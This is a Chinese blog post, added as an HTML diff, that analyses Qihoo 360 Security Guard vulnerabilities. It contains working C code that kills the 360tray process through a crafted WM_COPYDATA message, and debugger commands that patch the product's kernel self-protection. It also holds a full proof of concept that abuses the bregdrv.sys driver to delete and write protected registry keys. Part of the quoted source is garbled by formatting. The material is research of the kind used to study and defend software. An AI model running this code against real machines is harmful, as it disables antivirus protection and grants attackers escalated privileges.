@@ -1,0 +1,1476 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="../../../../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/my.css">
+
+    <script src="../../../../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title"></h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="../../../../../../../libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="某数字卫士溢出漏洞分析（一）"><a href="#某数字卫士溢出漏洞分析（一）" class="headerlink" title="某数字卫士溢出漏洞分析（一）"></a>某数字卫士溢出漏洞分析（一）</h2><p>通分析某RAT payload运行后可以关闭某数字安全卫士，根据rat payload逆向分析发现该rat只是运行了以下代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+HMODULE h360 =GetModuleHandle(TEXT("safemon.dll"));
+int i = 0;
+for (i = 0; i&lt;0x30000; i++)
+{
+if (memcmp((BYTE *)(h360+i), "\x83\xEC\x10\x56\x8D\x44\x24\x04\x50",9)==0)
+{
+         break;
+}
+}
+if (i==0x30000)
+{
+return;
+}
+FARPROC funcGet360HWND = (FARPROC)(h360+i);
+HWND hWnd = (HWND)funcGet360HWND();
+COPYDATASTRUCT cpdata;
+cpdata.dwData = 0x4d47534d;
+cpdata.cbData = 0x1000;
+cpdata.lpData = msgbuf;  //长度0x1000字节的随即数据，其中不能有连续\x00\x00
+SendMessage(hWnd, WM_COPYDATA, NULL,(LPARAM)&amp;cpdata);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们自己用上面代码运行之后，360安全卫士的进程（360tray.exe）就自动退出了。注意：这个程序必须是带窗口的程序，而不能使控制台程序，因为控制台程序是不加载safemon.dll的。</p>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h3><p>上面如此简单的代码就能导致关闭360，我们来看一下这段代码到底做了什么？首先获得safemon.dll的模块地址，每个有图形界面都会加载这个dll。然后从这个模块里找一处特征代码，经分析发现找的是以下代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">67366570   83EC 10         sub     esp, 10
+67366573   56              push    esi
+67366574   8D4424 04       lea     eax, dword ptr [esp+4]
+67366578   50              push    eax
+67366579   6A 00           push   0
+6736657B   8D4C24 10       lea     ecx, dword ptr [esp+10]
+6736657F   51              push    ecx
+67366580   68 40653667     push    67366540
+67366585   6A 00           push    0
+67366587   6A 00           push    0
+67366589   C74424 20 E48D4&gt;mov     dwordptr [esp+20], 67418DE4                   ; ASCII "Q360SafeMonClass"
+67366591   C74424 24 00000&gt;mov     dwordptr [esp+24], 0
+67366599   C74424 28 00000&gt;mov     dwordptr [esp+28], 0
+673665A1   FF15 10D34067   call    dword ptr [&lt;&amp;KERNEL32.GetCurrentProcess&gt;]       ; kernel32.GetCurrentProcess
+673665A7   50              push    eax
+673665A8   FF15 58D14067   call    dword ptr[&lt;&amp;KERNEL32.CreateRemoteThread&gt;]     ; kernel32.CreateRemoteThread
+673665AE   8BF0            mov     esi,eax
+673665B0   85F6            test    esi, esi
+673665B2   74 10           je      short 673665C4
+673665B4   6A FF           push    -1
+673665B6   56              push    esi
+673665B7   FF15 24D14067   call    dword ptr [&lt;&amp;KERNEL32.WaitForSingleObject&gt;]     ; kernel32.WaitForSingleObject
+673665BD   56              push    esi
+673665BE   FF15 20D34067   call    dword ptr[&lt;&amp;KERNEL32.CloseHandle&gt;]            ; kernel32.CloseHandle
+673665C4   8B4424 10       mov     eax, dword ptr [esp+10]
+673665C8   5E              pop     esi
+673665C9   83C4 10         add     esp, 10
+673665CC   C3              retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其作用就是找到Q360SafeMonClass的窗口句柄。找到这段代码后就会执行这段代码来获取该窗口句柄。为什么不直接用FindWindow来查找呢？据分析应该是360做了一些防护，直接找怕找不到。</p>
+<p>找到这个窗口后会给他发送WM_COPYDATA消息，附带的消息COPYDATASTRUCT结构的dwData是0x4d47534d，数据长度是0×1000，内容是随机数据。</p>
+<p>我自己写了个程序模拟上述功能后，运行成功结束了360tray的进程，证明原理是没有错的。</p>
+<h2 id="某数字卫士溢出漏洞分析（二）"><a href="#某数字卫士溢出漏洞分析（二）" class="headerlink" title="某数字卫士溢出漏洞分析（二）"></a>某数字卫士溢出漏洞分析（二）</h2><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a><strong>漏洞调试</strong></h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650241554092/97c7459335d646c8a7dd35728ca60c26.png" alt="image.png"></p>
+<p>究竟是什么原因导致360tray如此简单就被关闭呢，我决定调试一下360看，启动OD准备附加360tray进程，发现无法附加，360做了保护。要想调试360首先要把保护去掉。</p>
+<p>用XueTr看360的内核Hook点，并尝试恢复：</p>
+<p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650241554092/d9c989d6026d4fc398131913650858d6.png" alt="image.png"></p>
+<p>恢复之后尝试OD附加仍然失败，再刷新hook点已经被恢复了，这是当然的，360也要保护自身嘛。于是windbg开双机调试，在hook点下写断点，这样当360驱动恢复这里的时候，我们把他nop掉。</p>
+<pre class="line-numbers language-none"><code class="language-none">kd&gt; eb f747ed78 c3
+kd&gt; u f747ed78
+Hookport+0xcd78:
+f747ed78 c3              ret
+f747ed79 ff558b          call    dword ptr [ebp-75h]
+f747ed7c ec              in      al,dx
+f747ed7d 51              push   ecx
+f747ed7e 51              push    ecx
+f747ed7f 8d45fc          lea     eax,[ebp-4]
+f747ed82 50              push    eax
+f747ed83 ff1594ff47f7    call   dword ptr [Hookport+0xdf94 (f747ff94)]
+kd&gt; g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="某数字卫士溢出漏洞分析（三）"><a href="#某数字卫士溢出漏洞分析（三）" class="headerlink" title="某数字卫士溢出漏洞分析（三）"></a>某数字卫士溢出漏洞分析（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650241554092/b8181d9292b54b0fbe46e2acf7a04907.png" alt="image.png"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>经过调试发现，导致360出错退出的地方在360safemonpro.tpi这个模块里inline编译的vsnwprintf，从这里调用：</p>
+<p><a target="_blank" rel="noopener" href="http://www.j0s1ph.com/wp-content/uploads/2014/04/1397446938227.jpg"><img src="http://www.j0s1ph.com/wp-content/uploads/2014/04/1397446938227.jpg" alt="1397446938227" title="点击查看大图"></a></p>
+<p>IDA里面的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">int sub_10012240(wchar_t *Format, ...)
+{
+  int v1; // eax@1
+  wchar_t Dest; // [sp+0h] [bp-1000h]@1
+  __int16 v4; // [sp+FFEh] [bp-2h]@4
+  va_list va; // [sp+1008h] [bp+8h]@1
+
+  va_start(va, Format);
+  v1 = vsnwprintf(&amp;Dest, 0x7FFu, Format, va);
+  if ( v1 &lt; 0 || (unsigned int)v1 &gt; 0x7FF || v1 == 2047 )
+    v4 = 0;
+  sub_10013670();
+  return sub_10012BC0(&amp;Dest);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对应的源代码是：<br>output.c<br>/<em>textlen now contains length in multibyte chars <em>/<br>} else{<br>if(text.wz== NULL) /</em> NULLpassed, use special string <em>/<br>text.wz = __wnullstring;<br>bufferiswide= 1;<br>pwch= text.wz;<br>while(i– &amp;&amp; <em>pwch)  //这里出错了<br>++pwch;<br>textlen= (int)(pwch- text.wz);       /</em> in wchar_ts</em>/<br>/<em>textlen now contains length in wide chars <em>/<br>}<br>看起来360的用法是没有错的，这里不存在溢出之类的漏洞，我分析认为这是微软挖的一个坑，360不幸掉进去了，对WM_COPYDATA的数据处理不当回导致访问未映射的内存。<br>以下是来自网上的WM_COPYDATA数据传递的原理：<br>跨线程的WM_COPYDATA没有使用共享内存，反而复制了两次数据<br>发送者SendMessage-&amp;#x3e;xxxSendMessageTimeout-&amp;#x3e;xxxInterSendMsgEx(UserAllocPoolWithQuota分配内核内存，将用户数据复制到内核空间)-&amp;#x3e;SetWakeBit唤醒接受者-&amp;#x3e;SetWakeBit等待应答<br>接受者xxxReceiveMessage-&amp;#x3e;XXXSENDMESSAGETOCLIENT(宏)-&amp;#x3e;ScSendMessageSMS(也是宏)-&amp;#x3e;SfnCOPYDATA(sender side)-&amp;#x3e;CaptureCallbackData(把数据从内核空间复制到用户空间)-&amp;#x3e;KeUserModeCallback(转到用户模式)-&amp;#x3e;SfnCOPYDATA(receiver side)-&amp;#x3e;窗口过程-&amp;#x3e;回到内核模式，应答发送者………..<br>?<br>所以传递的数据并不是一块新分配的heap，而0×1000为单位长度映射的内存空间，是一块没头没尾的空间，一旦使用一些字符串操作函数直接访问这块空间，很容易造成越界访问到没映射的内存里。<br>??为了证实这个理论，我们可以自己写一个WM_COPYDATA的是以消息处理函数，模拟漏洞的产生过程：????<br>BOOL CrecvDlg::OnCopyData(CWnd</em> pWnd, COPYDATASTRUCT</em> pCopyDataStruct)<br>{<br>wchar_t buf[0x2000]={0};<br>_snwprintf(buf, 0x2000, L”url=%s”, pCopyDataStruct-&amp;#x3e;lpData);<br>return CDialog::OnCopyData(pWnd, pCopyDataStruct);<br>}<br>这段代码看上去是没什么问题的，直接把传进来的lpData当做字符串来处理。我们再写一个发送函数：<br>HWND hWnd=FindWindowA(“#32770″,”recv”);<br>if (hWnd)<br>{<br>int len=0x1000; //这一定要是0x1000的整数倍<br>char</em>buf=new char[len];<br>memset(buf, 0x41, len);<br>COPYDATASTRUCTcpdata;<br>cpdata.dwData = 0x4d47534d;<br>cpdata.cbData = len;<br>cpdata.lpData = buf;<br>SendMessage(hWnd, WM_COPYDATA,NULL, (LPARAM)&amp;cpdata);<br>delete[] buf;<br>}</p>
+<h2 id="某数字卫士被绕过漏洞分析（四）"><a href="#某数字卫士被绕过漏洞分析（四）" class="headerlink" title="某数字卫士被绕过漏洞分析（四）"></a>某数字卫士被绕过漏洞分析（四）</h2><p>Description:</p>
+<p>Qihoo 360 Security Guard is very famous in China.</p>
+<p>Some vulnerabilities have been reported in Qihoo 360 Security Guard, which can be exploited by malicious, local users to gain escalated privileges.</p>
+<p>An error in the kernel-mode driver (bregdrv.sys) when handling input passed through the user-mode dynamic link library (bregdll.dll) can be exploited to</p>
+<p>read/write/modification registry in kernel mode.</p>
+<p>An attacker can exploit this issue to read/write/modification registry with kernel-level privileges. Successful exploits will result in the complete</p>
+<p>compromise of affected computers.</p>
+<p>Details:</p>
+<p>The kernel-mode driver (bregdrv.sys) use CmXxx series functions to read/write/modification registry with kernel-level privileges, bregdll.dll wrappers</p>
+<p>implementation, the bregdll.dll improperly validating input passed from user mode to the kernel. All users can obtain handle of unprotected device</p>
+<p>bregdrv.sys to read/write/modification registry with kernel-level privileges.</p>
+<p>译文：</p>
+<pre class="line-numbers language-none"><code class="language-none">说明：
+
+奇虎360安全卫士在中国非常有名。
+
+奇虎 360 安全卫士中报告了一些漏洞，恶意的本地用户可以利用这些漏洞获得升级权限。
+
+在处理通过用户模式动态链接库 (bregdll.dll) 传递的输入时，内核模式驱动程序 (bregdrv.sys) 中的错误可被利用
+
+在内核模式下读/写/修改注册表。
+
+攻击者可以利用此问题以内核级权限读取/写入/修改注册表，成功利用将导致完整
+
+受影响的计算机的妥协。
+
+
+详情： 详情：
+
+内核模式驱动程序 (bregdrv.sys) 使用 CmXxx 系列函数以内核级权限读取/写入/修改注册表，bregdll.dll 包装器
+
+实现，bregdll.dll 不正确地验证从用户模式传递到内核的输入。所有用户都可以获得未受保护设备的句柄
+
+bregdrv.sys 以内核级权限读取/写入/修改注册表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;windows.h&gt;
+
+typedef BOOL (WINAPI *INIT_REG_ENGINE)();
+typedef LONG (WINAPI *BREG_DELETE_KEY)(HKEY hKey, LPCSTR lpSubKey);
+typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
+typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);
+typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);
+
+BREG_DELETE_KEY BRegDeleteKey = NULL;
+BREG_OPEN_KEY BRegOpenKey = NULL;
+BREG_CLOSE_KEY BRegCloseKey = NULL;
+REG_SET_VALUE_EX BRegSetValueEx = NULL;
+
+#define AppPath   "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\360safe.exe"
+
+#define TestDeleteKey  HKEY_LOCAL_MACHINE
+#define TestDeleteRegPath "Software\\360Safe\\Update"
+
+#define TestSetKey  HKEY_LOCAL_MACHINE
+#define TestSetPath  "Software\\360Safe"
+
+BOOL InitBRegDll()
+{
+ LONG lResult;
+ HKEY hKey;
+
+ CHAR cPath[MAX_PATH + 32] = { 0 };
+ DWORD dwPathLen = MAX_PATH;
+
+ lResult = RegOpenKeyA(HKEY_LOCAL_MACHINE, AppPath, &amp;hKey);
+ if (FAILED(lResult))
+  return FALSE;
+
+ DWORD dwType = REG_SZ;
+ lResult = RegQueryValueExA(hKey, "Path", NULL, &amp;dwType, (LPBYTE)cPath, &amp;dwPathLen);
+ RegCloseKey(hKey);
+ if (FAILED(lResult))
+  return FALSE;
+
+ strcat(cPath, "\\deepscan\\BREGDLL.dll&lt;file://\\deepscan\\BREGDLL.dll&gt;");
+
+ HMODULE modBReg = LoadLibraryA(cPath);
+ if (!modBReg)
+  return FALSE;
+
+ INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProcAddress(modBReg, "InitRegEngine");
+ BRegDeleteKey = (BREG_DELETE_KEY)GetProcAddress(modBReg, "BRegDeleteKey");
+ BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress(modBReg, "BRegOpenKey");
+ BRegCloseKey = (BREG_CLOSE_KEY)GetProcAddress(modBReg, "BRegCloseKey");
+ BRegSetValueEx = (REG_SET_VALUE_EX)GetProcAddress(modBReg, "BRegSetValueEx");
+
+ if (!InitRegEngine || !BRegDeleteKey || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx) {
+  FreeLibrary(modBReg);
+  return FALSE;
+ }
+
+ if (!InitRegEngine()) {
+  FreeLibrary(modBReg);
+  return FALSE;
+ }
+
+ return TRUE;
+}
+
+LONG TestSetRegKey()
+{
+ HKEY hKey;
+ LONG lResult;
+
+ lResult = BRegOpenKey(TestSetKey, TestSetPath, &amp;hKey);
+ if (FAILED(lResult))
+  return lResult;
+
+ DWORD dwType = REG_SZ;
+ static char szData[] = "TEST VALUE";
+ lResult = BRegSetValueEx(hKey, TestSetPath, NULL, dwType, (const BYTE *)&amp;szData, (DWORD)sizeof(szData));
+ BRegCloseKey(hKey);
+
+ return lResult;
+}
+
+int main(int argc, char *argv[])
+{
+ if (!InitBRegDll()) {
+  MessageBoxA(NULL, "Initialization BReg error！", "error", MB_ICONSTOP);
+  return 1;
+ }
+
+ if (FAILED(BRegDeleteKey(TestDeleteKey, TestDeleteRegPath))) {
+  MessageBoxA(NULL, "DeleteKey error！", "error", MB_ICONSTOP);
+  return 2;
+ }
+
+ if (FAILED(TestSetRegKey())) {
+  MessageBoxA(NULL, "SetRegKey error！", "error", MB_ICONSTOP);
+  return 3;
+ }
+
+ MessageBoxA(NULL, "Broke System Security Check，Gain Escalated Privileges，Successful exploit！", "Successful", MB_OK);
+ return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
